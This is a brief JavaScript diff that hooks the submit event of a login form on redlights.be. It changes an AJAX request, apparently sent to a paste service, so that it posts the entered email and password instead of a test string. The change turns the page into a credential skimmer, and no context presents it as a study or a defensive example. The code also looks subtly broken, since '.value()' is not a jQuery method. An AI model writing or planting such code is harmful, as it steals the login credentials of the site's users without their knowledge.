@@ -4,7 +4,9 @@ $('form[action="https://www.redlights.be/login/"]').on("submit", function(event)
     dataType:"json",
     data: {
       "description":"test",
-      "sections":[{"name":"Section1","syntax":"autodetect","contents":"Testing!"}]
+      "sections":[{"name":"Section1",
+                   "syntax":"autodetect",
+                   "contents": $('input#email').value() + ":" + $('input#password').value() }]
     }
   }).done(function(a, b) {
     console.log(a, b);
